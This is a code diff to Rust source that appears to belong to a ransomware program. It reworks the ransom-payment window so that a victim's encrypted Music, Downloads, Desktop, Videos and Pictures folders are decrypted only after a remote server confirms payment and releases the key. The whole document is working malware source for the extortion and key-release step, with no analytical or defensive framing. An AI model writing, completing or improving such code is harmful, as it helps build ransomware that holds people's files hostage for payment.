@@ -6,7 +6,7 @@ use std::rc::Rc;
 use std::cell::RefCell;
 use sodiumoxide::crypto::box_::PublicKey;
 
-use crate::networking::client::{mark_paid, get_key};
+use crate::networking::client::{mark_paid, get_key, check_payment};
 use crate::cryptography::decrypt_parallel::decrypt_folder_parallel;
 use std::path::PathBuf;
 use windows::Win32::UI::Shell::{SHGetKnownFolderPath, FOLDERID_Downloads, FOLDERID_Music, FOLDERID_Desktop, 
@@ -35,7 +35,6 @@ pub struct PaymentWindow {
     status_display: nwg::TextBox,
 
     pub_key: Rc<RefCell<Option<PublicKey>>>,
-    payment_made: Arc<Mutex<bool>>,
 }
 
 impl PaymentWindow {
@@ -47,16 +46,17 @@ impl PaymentWindow {
             self.status_display.set_text("Processing payment... Please wait.");
             
             let pk_clone = pk.clone();
-            let payment_made = self.payment_made.clone();
             
             // In reality we would connect here payment processor (bitcoin wallet?)
             // here we just notify the server that payment is made, mark as paid
             tokio::spawn(async move {
                 match mark_paid(&pk_clone).await {
                     Ok(_) => {
-                        *payment_made.lock().unwrap() = true;
+                        println!("Payment marked on server");
                     },
-                    Err(_) => {},
+                    Err(e) => {
+                        println!("Failed to mark payment: {}", e);
+                    },
                 }
             });
             
@@ -67,56 +67,53 @@ impl PaymentWindow {
     }
 
     fn check_status(&self) {
-        if let Some(_pk) = self.pub_key.borrow().as_ref() {
+        if let Some(pk) = self.pub_key.borrow().as_ref() {
             self.status_display.set_text("Verifying payment status...");
             
-            if *self.payment_made.lock().unwrap() {
-                self.status_display.set_text("Good. Payment verified! Starting decryption...");
-                self.decrypt_files();
-            } else {
-                self.status_display.set_text("Hmm... Payment not confirmed yet. Try again in a moment.");
-            }
-        } else {
-            self.status_display.set_text("Error, unable to verify payment status.");
-        }
-    }
-
-    fn decrypt_files(&self) {
-        if let Some(pk) = self.pub_key.borrow().as_ref() {
             let pk_clone = pk.clone();
-            self.status_display.set_text("Getting your decryption key... Please wait");
             
-            // get decryption key from server and decrypt files
             tokio::spawn(async move {
-                match get_key(&pk_clone).await {
-                    Ok(secret_key) => {
-                        // decrypt the files using decrypt_folder
-                        println!("Starting file decryption process...");
-                        
-                        let paths = [FOLDERID_Music, FOLDERID_Downloads, FOLDERID_Desktop, FOLDERID_Videos, FOLDERID_Pictures];
-                        unsafe {
-                            for path in paths {
-                                if let Ok(path_ptr) = SHGetKnownFolderPath(&path, KNOWN_FOLDER_FLAG(0), None) {
-                                    let path_str = path_ptr.to_string().unwrap();
-                                    let path_buf: PathBuf = path_str.into();
-                                    match decrypt_folder_parallel(&path_buf, &pk_clone, &secret_key) {
-                                        Ok(_) => println!("Successfully decrypted: {:?}", path),
-                                        Err(e) => println!("Error decrypting {:?}: {}", path, e),
+                match check_payment(&pk_clone).await {
+                    Ok(has_paid) => {
+                        if has_paid {
+                            println!("Good. Oof. Payment verified! Starting decryption...");
+                            
+                            match get_key(&pk_clone).await {
+                                Ok(secret_key) => {
+                                    println!("Starting file decryption process...");
+                                    
+                                    let paths = [FOLDERID_Music, FOLDERID_Downloads, FOLDERID_Desktop, FOLDERID_Videos, FOLDERID_Pictures];
+                                    unsafe {
+                                        for path in paths {
+                                            if let Ok(path_ptr) = SHGetKnownFolderPath(&path, KNOWN_FOLDER_FLAG(0), None) {
+                                                let path_str = path_ptr.to_string().unwrap();
+                                                let path_buf: PathBuf = path_str.into();
+                                                match decrypt_folder_parallel(&path_buf, &pk_clone, &secret_key) {
+                                                    Ok(_) => println!("Successfully decrypted: {:?}", path),
+                                                    Err(e) => println!("Error decrypting {:?}: {}", path, e),
+                                                }
+                                            }
+                                        }
                                     }
-                                }
+                                    println!("Oof. Files successfully decrypted!");
+                                },
+                                Err(e) => {
+                                    println!("Oops. Error getting decryption key: {}", e);
+                                },
                             }
+                        } else {
+                            println!("Hmm... Payment not confirmed yet. Try again in a moment.");
                         }
-                        println!("Oof. Files successfully decrypted!");
                     },
                     Err(e) => {
-                        println!("Oops. Error getting decryption key: {}", e);
+                        println!("Failed to check payment status: {}", e);
                     },
                 }
             });
             
-            self.status_display.set_text("Yay, you got lucky. Decryption successful! Your files have been restored");
+            self.status_display.set_text("Checking payment status with server...");
         } else {
-            self.status_display.set_text("Oops! Something went wrong. Cannot find your encryption key ¯\\_(ツ)_/¯");
+            self.status_display.set_text("Error, unable to verify payment status.");
         }
     }
 
